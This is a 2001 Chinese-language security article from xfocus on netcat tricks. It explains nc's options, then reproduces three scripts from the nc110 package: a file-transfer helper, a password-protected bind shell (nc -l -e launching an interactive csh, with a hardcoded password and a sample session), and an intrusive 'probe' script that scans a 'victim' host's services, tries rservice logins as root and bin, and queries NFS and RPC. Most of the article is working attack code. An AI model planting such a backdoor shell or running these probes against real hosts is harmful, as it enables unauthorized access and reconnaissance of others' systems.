---
title: "nc使用技巧"
date: 2001-03-02T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-88"
---

文章提交：[quack](http://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

nc使用技巧

by quack<quack@21cn.com>

[http://www.xfocus.org  ](http://www.xfocus.org�0�2�0�2/)安全焦点

nc这个小玩意儿应该大家耳熟能详，也用了N年了吧……这里不多讲废话，结合一些script说说它的使用技巧。

(文中所举的script都来自于nc110.tgz的文件包)

一、基本使用

Quack# nc -h

[v1.10]

想要连接到某处:   nc [-options] hostname port[s] [ports] ...

绑定端口等待连接:     nc -l -p port [-options] [hostname] [port]

参数:

        -e prog                 程序重定向，一旦连接，就执行 [危险!!]

        -g gateway              source-routing hop point[s], up to 8

        -G num                  source-routing pointer: 4, 8, 12, ...

        -h                      帮助信息

        -i secs                 延时的间隔

        -l                      监听模式，用于入站连接

        -n                      指定数字的IP地址，不能用hostname

        -o file                 记录16进制的传输

        -p port                 本地端口号

        -r                      任意指定本地及远程端口

        -s addr                 本地源地址

        -u                      UDP模式

        -v                      详细输出――用两个-v可得到更详细的内容

        -w secs                 timeout的时间

        -z                      将输入输出关掉――用于扫描时

      

其中端口号可以指定一个或者用lo-hi式的指定范围。

二、用于传输文件――ncp

#! /bin/sh

## 类似于rcp，但是是用netcat在高端口做的

## 在接收文件的机器上做"ncp targetfile"

## 在发送文件的机器上做"ncp sourcefile receivinghost"

## 如果调用了 "nzp" ，会将传输文件压缩

## 这里定义你想使用的端口，可以自由选择

MYPORT=23456

## 如果nc没有在系统路径中的话，要把下面一行注释去掉，加以修改

# PATH=${HOME}:${PATH} ; export PATH

## 下面这几行检查参数输入情况

test "$3" && echo "too many args" && exit 1

test ! "$1" && echo "no args?" && exit 1

me=`echo $0 | sed 's+.*/++'`

test "$me" = "nzp" && echo '[compressed mode]'

# if second arg, it's a host to send an [extant] file to.

if test "$2" ; then

  test ! -f "$1" && echo "can't find $1" && exit 1

  if test "$me" = "nzp" ; then

    compress -c < "$1" | nc -v -w 2 $2 $MYPORT && exit 0

  else

    nc -v -w 2 $2 $MYPORT < "$1" && exit 0

  fi

  echo "transfer FAILED!"

  exit 1

fi

# 是否在接收文件机器当前目录有同名文件

if test -f "$1" ; then

  echo -n "Overwrite $1? "

  read aa

  test ! "$aa" = "y" && echo "[punted!]" && exit 1

fi

# 30 seconds oughta be pleeeeenty of time, but change if you want.

if test "$me" = "nzp" ; then

# 注意这里nc的用法，结合了重定向符号和管道

  nc -v -w 30 -p $MYPORT -l < /dev/null | uncompress -c  > "$1" && exit 0

else

  nc -v -w 30 -p $MYPORT -l < /dev/null > "$1" && exit 0

fi

echo "transfer FAILED!"

# clean up, since even if the transfer failed, $1 is already trashed

rm -f "$1"

exit 1

这样的话，我只要在A机器上先 QuackA# ncp ../abcd

listening on [any] 23456 ...

然后在另一台机器B上

QuackB#ncp abcd 192.168.0.2

quackb [192.168.0.1] 23456 (?)

A机上出现

open connect to [192.168.0.2] from quackb [192.168.0.1] 1027

#

查看一下，文件传输完毕。

三、用于绑定端口――bsh

首先要清楚，如果你编译netcat时仅用如make freebsd之类的命令来编译的话，这个工

具是无法利用的――要define一个GAPING_SECURITY_HOLE它才会提供-e选项。

#! /bin/sh

## 一个利用nc的绑定shell并且带有密码保护的脚本

## 带有一个参数，即端口号

NC=nc

case "$1" in

  ?* )

  LPN="$1"

  export LPN

  sleep 1

  #注意这里nc的用法，参数-l是lister，-e是执行重定向

  echo "-l -p $LPN -e $0" ; $NC -l -p $LPN -e $0 > /dev/null 2>&1 &

  echo "launched on port $LPN"

  exit 0

  ;;

esac

# here we play inetd

echo "-l -p $LPN -e $0" ; $NC -l -p $LPN -e $0 > /dev/null 2>&1 &

while read qq ; do

case "$qq" in

# 这里就是弱密码保护了，密码是quack

  quack )

  cd /

  exec csh -i

  ;;

esac

done

要看看它是怎么使用的么？

quack# ./bsh 6666  <-------输入，后面是程序输出

-l -p 6666 -e ./bsh

launched on port 6666

quack# 

quack## nc localhost 6666  <----------输入

-l -p 6666 -e ./bsh

quack    <----------输入，密码验证

Warning: imported path contains relative components

Warning: no access to tty (Bad file descriptor).

Thus no job control in this shell.

Cracker# 

四、 用于端口扫描――probe

在我们常见的一些端口扫描程序中，如Vetescan这类以shell script写成的话，很多都

需要系统中装有netcat，原因何在呢？看看下面的script，你或许会明白一些。

#! /bin/sh

## launch a whole buncha shit at yon victim in no particular order; capture

## stderr+stdout in one place.  Run as root for rservice and low -p to work.

## Fairly thorough example of using netcat to collect a lot of host info.

## Will set off every intrusion alarm in existence on a paranoid machine!

# 该目录里有一些小工具

DDIR=../data

# 指定网关

GATE=192.157.69.11

# might conceivably wanna change this for different run styles

UCMD='nc -v -w 8'

test ! "$1" && echo Needs victim arg && exit 1

echo '' | $UCMD -w 9 -r "$1" 13 79 6667 2>&1

echo '0' | $UCMD "$1" 79 2>&1

# if LSRR was passed thru, should get refusal here:

# 要注意这里的用法，其实nc的这些参数掌握好可以做很多事情

$UCMD -z -r -g $GATE "$1" 6473 2>&1

$UCMD -r -z "$1" 6000 4000-4004 111 53 2105 137-140 1-20 540-550 95 87 2>&1

# -s `hostname` may be wrong for some multihomed machines

echo 'UDP echoecho!' | nc -u -p 7 -s `hostname` -w 3 "$1" 7 19 2>&1

echo '113,10158' | $UCMD -p 10158 "$1" 113 2>&1

rservice bin bin | $UCMD -p 1019 "$1" shell 2>&1

echo QUIT | $UCMD -w 8 -r "$1" 25 158 159 119 110 109 1109 142-144 220 23 2>&1

# newline after any telnet trash

echo ''

echo PASV | $UCMD -r "$1" 21 2>&1

echo 'GET /' | $UCMD -w 10 "$1" 80 81 210 70 2>&1

# sometimes contains useful directory info:

# 知道robots.txt是什么文件么？;)

echo 'GET /robots.txt' | $UCMD -w 10 "$1" 80 2>&1

# now the big red lights go on

# 利用小工具rservice来尝试，该工具可以在nc110.tgz的data目录里找到

rservice bin bin 9600/9600 | $UCMD -p 1020 "$1" login 2>&1

rservice root root | $UCMD -r "$1" exec 2>&1

echo 'BEGIN big udp -- everything may look "open" if packet-filtered'

data -g < ${DDIR}/nfs-0.d | $UCMD -i 1 -u "$1" 2049 | od -x 2>&1

# no wait-time, uses RTT hack

nc -v -z -u -r "$1" 111 66-70 88 53 87 161-164 121-123 213 49 2>&1

nc -v -z -u -r "$1" 137-140 694-712 747-770 175-180 2103 510-530 2>&1

echo 'END big udp'

$UCMD -r -z "$1" 175-180 2000-2003 530-533 1524 1525 666 213 8000 6250 2>&1

# Use our identd-sniffer!

iscan "$1" 21 25 79 80 111 53 6667 6000 2049 119 2>&1

# this gets pretty intrusive, but what the fuck.  Probe for portmap first

if nc -w 5 -z -u "$1" 111 ; then

  showmount -e "$1" 2>&1   #象showmount和rpcinfo的使用，可能会被逮到;)

  rpcinfo -p "$1" 2>&1

fi

exit 0

感觉也没什么好说的，脚本本身说明了一切。当然象上面的脚本只是示范性的例子，真正地使用时，

这样扫描会留下大量的痕迹，系统管理员会额外小心;)

多试试，多想想，可能你可以用它来做更多事情――你可以参见nc110.tgz里script目录下的那

些脚本，从中获得一些思路。
